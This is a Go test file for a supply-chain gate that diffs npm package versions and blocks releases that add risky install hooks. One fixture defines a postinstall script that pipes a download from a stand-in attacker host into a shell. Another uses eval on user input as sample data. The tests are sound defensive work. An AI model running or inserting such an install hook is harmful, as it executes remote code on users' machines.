package gate

import (
	"bytes"
	"context"
	"io"
	"testing"

	"github.com/alessandro-bitetto/chaindora/internal/registries"
)

type stubVersionDiff struct {
	versions  []registries.VersionInfo
	tarballs  map[string][]byte // version → tarball bytes
	urlErr    error
	fetchErr  error
}

func (s stubVersionDiff) AllVersions(context.Context, string) ([]registries.VersionInfo, error) {
	return s.versions, nil
}
func (s stubVersionDiff) TarballURL(_ context.Context, _, version string) (string, error) {
	if s.urlErr != nil {
		return "", s.urlErr
	}
	return "stub://tarball/" + version, nil
}
func (s stubVersionDiff) FetchTarball(_ context.Context, url string, dst writeTo) error {
	if s.fetchErr != nil {
		return s.fetchErr
	}
	// URL ends in version per the stub.
	version := url[len("stub://tarball/"):]
	data, ok := s.tarballs[version]
	if !ok {
		return io.EOF
	}
	_, err := dst.Write(data)
	return err
}

// Compile-time check: stubVersionDiff implements versionDiffProbe.
var _ versionDiffProbe = stubVersionDiff{}

func TestVersionDiff_ApprovesWhenNoNewPatterns(t *testing.T) {
	clean := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.1"}`,
		"index.js":     "module.exports = 42;",
	})
	v := &VersionBumpDiff{
		NPM: stubVersionDiff{
			versions: []registries.VersionInfo{{Version: "1.0.0"}, {Version: "1.0.1"}},
			tarballs: map[string][]byte{"1.0.0": clean, "1.0.1": clean},
		},
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.1"})
	if r.Verdict != VerdictApprove {
		t.Errorf("identical-tree bump should Approve, got %v: %q", r.Verdict, r.Reason)
	}
}

func TestVersionDiff_BlocksWhenNewVersionAddsPostinstall(t *testing.T) {
	clean := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.0"}`,
		"index.js":     "module.exports = 42;",
	})
	malicious := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.1","scripts":{"postinstall":"curl http://attacker/payload | sh"}}`,
		"index.js":     "module.exports = 42;",
	})
	v := &VersionBumpDiff{
		NPM: stubVersionDiff{
			versions: []registries.VersionInfo{{Version: "1.0.0"}, {Version: "1.0.1"}},
			tarballs: map[string][]byte{"1.0.0": clean, "1.0.1": malicious},
		},
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.1"})
	if r.Verdict != VerdictBlock {
		t.Errorf("postinstall added in new version should Block, got %v: %q", r.Verdict, r.Reason)
	}
}

func TestVersionDiff_NoPriorApproves(t *testing.T) {
	v := &VersionBumpDiff{
		NPM: stubVersionDiff{
			versions: []registries.VersionInfo{{Version: "1.0.0"}}, // single version
		},
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.0"})
	if r.Verdict != VerdictApprove {
		t.Errorf("first version (no prior) should Approve (publisher-change handles new packages), got %v", r.Verdict)
	}
}

func TestVersionDiff_PreservedPatternsDontCount(t *testing.T) {
	// Both versions have eval() — that's the package's job
	// (a JS templating lib). The DELTA is zero so we approve.
	jsWithEval := `var x = userInput; eval(x);`
	v1 := buildTarball(t, map[string]string{
		"package.json": `{"name":"tpl","version":"1.0.0"}`,
		"compile.js":   jsWithEval,
	})
	v2 := buildTarball(t, map[string]string{
		"package.json": `{"name":"tpl","version":"1.0.1"}`,
		"compile.js":   jsWithEval,
	})
	v := &VersionBumpDiff{
		NPM: stubVersionDiff{
			versions: []registries.VersionInfo{{Version: "1.0.0"}, {Version: "1.0.1"}},
			tarballs: map[string][]byte{"1.0.0": v1, "1.0.1": v2},
		},
		BlockAt: 3, WarnAt: 1,
	}
	r := v.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "tpl", Version: "1.0.1"})
	if r.Verdict != VerdictApprove {
		t.Errorf("pre-existing eval should not Warn on diff, got %v: %q", r.Verdict, r.Reason)
	}
}

func TestPatternSet_TakesMaxWeight(t *testing.T) {
	fs := []StaticFinding{
		{Pattern: "x", Weight: 1},
		{Pattern: "x", Weight: 3},
		{Pattern: "x", Weight: 2},
		{Pattern: "y", Weight: 2},
	}
	got := patternSet(fs)
	if got["x"] != 3 {
		t.Errorf("x: got %d, want 3 (max)", got["x"])
	}
	if got["y"] != 2 {
		t.Errorf("y: got %d, want 2", got["y"])
	}
}

// Compile-time assertion that bytes.Buffer satisfies our writeTo
// alias so all the tests above can pass it through.
var _ writeTo = (*bytes.Buffer)(nil)
